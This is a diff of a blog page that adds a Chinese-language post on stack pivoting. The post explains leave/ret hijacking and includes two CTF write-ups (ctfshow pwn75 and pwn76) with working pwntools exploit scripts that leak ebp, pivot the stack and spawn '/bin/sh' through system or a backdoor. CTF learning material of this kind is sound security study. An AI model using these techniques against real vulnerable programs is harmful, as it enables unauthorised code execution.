@@ -19,22 +19,28 @@
   <meta name="author" content="TY">
   <meta name="keywords" content="">
   
-    <meta name="description" content="Record the learning of pwn on buu">
+    <meta name="description" content="Knowledge points of STACK">
 <meta property="og:type" content="article">
-<meta property="og:title" content="PWN-BUUCTF-2">
-<meta property="og:url" content="https://tforevery.github.io/PWN-BUUCTF-2/index.html">
+<meta property="og:title" content="STACK">
+<meta property="og:url" content="https://tforevery.github.io/STACK/index.html">
 <meta property="og:site_name" content="TY&#39;s Blog">
-<meta property="og:description" content="Record the learning of pwn on buu">
+<meta property="og:description" content="Knowledge points of STACK">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2025-07-20T06:24:18.000Z">
-<meta property="article:modified_time" content="2025-07-20T06:25:14.000Z">
+<meta property="og:image" content="https://tforevery.github.io/Images/1731166309399-ebfd58e7-4952-49c4-92c3-b87dea1de7d5.webp">
+<meta property="og:image" content="https://tforevery.github.io/Images/1742197459575-3d061d16-1c4d-4c90-846f-157b028544a8.webp">
+<meta property="og:image" content="https://tforevery.github.io/Images/1731168554722-c443e22e-3310-402e-ab80-c739a36bfa93.webp">
+<meta property="og:image" content="https://tforevery.github.io/Images/1742197344656-b604580b-5356-41e9-815f-2129faf45cc5.webp">
+<meta property="og:image" content="https://tforevery.github.io/Images/1731171062766-1c808c27-ab35-4d93-9f2a-3d6e5a2356b1.webp">
+<meta property="article:published_time" content="2025-11-09T06:59:07.000Z">
+<meta property="article:modified_time" content="2025-11-09T09:54:12.186Z">
 <meta property="article:author" content="TY">
-<meta property="article:tag" content="BUUCTF">
+<meta property="article:tag" content="STACK">
 <meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://tforevery.github.io/Images/1731166309399-ebfd58e7-4952-49c4-92c3-b87dea1de7d5.webp">
   
   
   
-  <title>PWN-BUUCTF-2 - TY&#39;s Blog</title>
+  <title>STACK - TY&#39;s Blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -213,7 +219,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="PWN-BUUCTF-2"></span>
+            <span id="subtitle" data-typed-text="STACK"></span>
           
         </div>
 
@@ -224,8 +230,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2025-07-20 14:24" pubdate>
-          2025年7月20日 下午
+        <time datetime="2025-11-09 14:59" pubdate>
+          2025年11月9日 下午
         </time>
       </span>
     
@@ -236,7 +242,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          0 字
+          814 字
         
       </span>
     
@@ -247,7 +253,7 @@
         
         
         
-          1 分钟
+          7 分钟
         
       </span>
     
@@ -340,7 +346,7 @@
       
         <a href="/PWN-BUUCTF-2/" title="PWN-BUUCTF-2"
            class="list-group-item list-group-item-action
-           active">
+           ">
           <span class="category-post">PWN-BUUCTF-2</span>
         </a>
       
@@ -349,7 +355,7 @@
       
         <a href="/STACK/" title="STACK"
            class="list-group-item list-group-item-action
-           ">
+           active">
           <span class="category-post">STACK</span>
         </a>
       
@@ -372,12 +378,12 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">PWN-BUUCTF-2</h1>
+            <h1 id="seo-header">STACK</h1>
             
               <p id="updated-time" class="note note-info" style="">
                 
                   
-                    本文最后更新于 2025年7月20日 下午
+                    本文最后更新于 2025年11月9日 下午
                   
                 
               </p>
@@ -385,7 +391,53 @@
             
               <div class="markdown-body">
                 
-                
+                <h1 id="Stack-pivoting"><a href="#Stack-pivoting" class="headerlink" title="Stack pivoting"></a>Stack pivoting</h1><h2 id="核心汇编"><a href="#核心汇编" class="headerlink" title="核心汇编"></a>核心汇编</h2><ul>
+<li>leave	：mov esp,ebp	 pop ebp;</li>
+<li>ret            ：pop eip;</li>
+</ul>
+<h2 id="原理实现"><a href="#原理实现" class="headerlink" title="原理实现"></a>原理实现</h2><h3 id="正常leave，ret还原现场"><a href="#正常leave，ret还原现场" class="headerlink" title="正常leave，ret还原现场"></a>正常leave，ret还原现场</h3><p><img src="/./../Images/1731166309399-ebfd58e7-4952-49c4-92c3-b87dea1de7d5.webp" srcset="/img/loading.gif" lazyload></p>
+<h3 id="劫持栈空间（劫持rsp）"><a href="#劫持栈空间（劫持rsp）" class="headerlink" title="劫持栈空间（劫持rsp）"></a>劫持栈空间（劫持rsp）</h3><p><img src="/./../Images/1742197459575-3d061d16-1c4d-4c90-846f-157b028544a8.webp" srcset="/img/loading.gif" lazyload></p>
+<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="ctfshowpwn75"><a href="#ctfshowpwn75" class="headerlink" title="ctfshowpwn75"></a>ctfshowpwn75</h3><blockquote>
+<p>read只允许我们读入0x30，存在后门system，但是没有&#x2F;bin&#x2F;sh，架构是i386，那么意味着我们只能读入两个地址（两个值）一个值覆盖old’s ebp，一个值会覆盖ret</p>
+<p>程序通过leave，ret还原现场</p>
+</blockquote>
+<p><img src="/./../Images/1731168554722-c443e22e-3310-402e-ab80-c739a36bfa93.webp" srcset="/img/loading.gif" lazyload></p>
+<blockquote>
+<p>leave 本质就是<code>mov esp,ebp; pop ebp</code></p>
+<p>那么我们的思路只能是往栈上写&#x2F;bin&#x2F;sh然后计算它在栈上的地址，把它的地址传递给backdoor</p>
+<p>栈上地址？ebp不就是在栈上的吗？不管是哪个个函数的ebp，都是始终在栈上的</p>
+<p>那么我们可以通过leak ctfshow()这个函数保存的old’s ebp来表示我们写入栈上的&#x2F;bin&#x2F;sh</p>
+<p>具体做法是利用printf不遇到\x00不终止的特性，我们利用第一次read填写junk data（垃圾数据不能存在0这个数据）到ebp的位置，通过printf解析出old’s ebp</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = (<span class="hljs-number">0x24</span>)*<span class="hljs-string">b&#x27;a&#x27;</span> + <span class="hljs-string">b&#x27;TTTT&#x27;</span><br>s(payload)<br>ru(<span class="hljs-string">&#x27;TTTT&#x27;</span>)<br><br>ebp = <span class="hljs-built_in">int</span>.from_bytes(rud(<span class="hljs-string">&#x27;\n&#x27;</span>)[:<span class="hljs-number">4</span>],<span class="hljs-string">&#x27;little&#x27;</span>)<br>lgw(<span class="hljs-built_in">hex</span>(ebp))<br></code></pre></td></tr></table></figure>
+
+<p>通过调试，查看old’s ebp到我们读入数据的地址的差值，利用ebp来表示其地址：<code>sAddr = ebp-0x38</code></p>
+<p><img src="/./../Images/1742197344656-b604580b-5356-41e9-815f-2129faf45cc5.webp" srcset="/img/loading.gif" lazyload></p>
+<p>然后我们想想怎么实现</p>
+<ol>
+<li>它的ret—-&gt; system.plt</li>
+<li>system的参数为Addr—-&gt;’&#x2F;bin&#x2F;sh’</li>
+</ol>
+<p>这里有一点要注意，i386架构下的程序通过栈传参，也就是说通过esp或者ebp传参</p>
+<p>通过这个，要想将我们写的’&#x2F;bin&#x2F;sh’传递给system，就需要控制esp</p>
+<ul>
+<li>通过ROPgadget</li>
+<li>通过leave</li>
+</ul>
+<p>因为只能写一个地址，那么ROPgadget完全无法实现，那么我们就只能考虑leave(mov esp,ebp;pop ebp)</p>
+<p>通过修改old’s ebp的值，在退出ctfshow()这个函数的时候，esp就会因为old’s ebp的值而被我们操控</p>
+<h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python">p = p32 <span class="hljs-keyword">if</span> i386 <span class="hljs-keyword">else</span> p64 <br>u = u32 <span class="hljs-keyword">if</span> i386 <span class="hljs-keyword">else</span> u64<br><br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>leaveRet = <span class="hljs-number">0x080484d5</span><br>system = elf.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>payload = (<span class="hljs-number">0x24</span>)*<span class="hljs-string">b&#x27;a&#x27;</span> + <span class="hljs-string">b&#x27;TTTT&#x27;</span><br><span class="hljs-comment"># gdp()</span><br>s(payload)<br>ru(<span class="hljs-string">&#x27;TTTT&#x27;</span>)<br>ebp = <span class="hljs-built_in">int</span>.from_bytes(rud(<span class="hljs-string">&#x27;\n&#x27;</span>)[:<span class="hljs-number">4</span>],<span class="hljs-string">&#x27;little&#x27;</span>)<br>lgw(<span class="hljs-built_in">hex</span>(ebp))<br><br>sAddr = ebp-<span class="hljs-number">0x38</span><br><br>payload = p(system) + p(<span class="hljs-number">0</span>) + p(sAddr+<span class="hljs-number">0xc</span>) +<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span><br>payload = payload.ljust(<span class="hljs-number">0x28</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)<br>payload += p(sAddr-<span class="hljs-number">4</span>) + p(leaveRet)<br><span class="hljs-comment"># 修改old&#x27;s ebp ----&gt; sAddr-4 </span><br><span class="hljs-comment"># 修改ret为	leaveRet 人为控制esp</span><br>sl(payload)<br><br>inter() 	<br></code></pre></td></tr></table></figure>
+
+<h3 id="ctfshowpwn76"><a href="#ctfshowpwn76" class="headerlink" title="ctfshowpwn76"></a>ctfshowpwn76</h3><p>先输入一个字符串，要求不能超过30的长度，</p>
+<p>接着对这个字符串进行base64解码，得到解码后的长度，检查长度是否大于0xC</p>
+<p>最后将小于0xC的解码后的字符串复制到input中，进行hash验证，如果通过，则进入backdoor</p>
+<p>这里则出现危险函数，mmcpy，v4的空间只到了ebp-8h，但是a1的值可以到0xC，那么就会修改ebp所指向的栈基地址</p>
+<p>那么就可以往input上写入payload，长度只能为0xC，也就是说只能玩里边写入4个值（p32()），如果大于则程序会结束，将栈基址修改成input的地址，劫持栈空间，控制程序流</p>
+<p>这里要注意这里是通过leave，retn来还原现场的，那么就会出现pop rbp，所以payload的前四个字节用垃圾数据填充**（具体参看：原理-劫持栈空间）**</p>
+<p><img src="/./../Images/1731171062766-1c808c27-ab35-4d93-9f2a-3d6e5a2356b1.webp" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python">p = p32 <span class="hljs-keyword">if</span> i386 <span class="hljs-keyword">else</span> p64 <br>u = u32 <span class="hljs-keyword">if</span> i386 <span class="hljs-keyword">else</span> u64<br><br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><br>shAddr = <span class="hljs-number">0x0811EB40</span><br>backdoor = <span class="hljs-number">0x08049284</span><br>payload = p(<span class="hljs-number">0</span>) + p(backdoor) + p(shAddr)<br>payload = base64.b64encode(payload)<br>sl(payload)<br><br>inter() <br></code></pre></td></tr></table></figure>
+
+
                 
               </div>
             
@@ -418,7 +470,7 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/BUUCTF/" class="print-no-link">#BUUCTF</a>
+        <a href="/tags/STACK/" class="print-no-link">#STACK</a>
       
     </div>
   
@@ -430,8 +482,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>PWN-BUUCTF-2</div>
-      <div>https://tforevery.github.io/PWN-BUUCTF-2/</div>
+      <div>STACK</div>
+      <div>https://tforevery.github.io/STACK/</div>
     </div>
     <div class="license-meta">
       
@@ -443,7 +495,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2025年7月20日</div>
+          <div>2025年11月9日</div>
         </div>
       
       
@@ -475,18 +527,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/Reverse-BUUCTF-1/" title="Reverse-BUUCTF-1">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">Reverse-BUUCTF-1</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/HEAP/" title="HEAP">
-                        <span class="hidden-mobile">HEAP</span>
+                      <a href="/Reverse-BUUCTF-1/" title="Reverse-BUUCTF-1">
+                        <span class="hidden-mobile">Reverse-BUUCTF-1</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
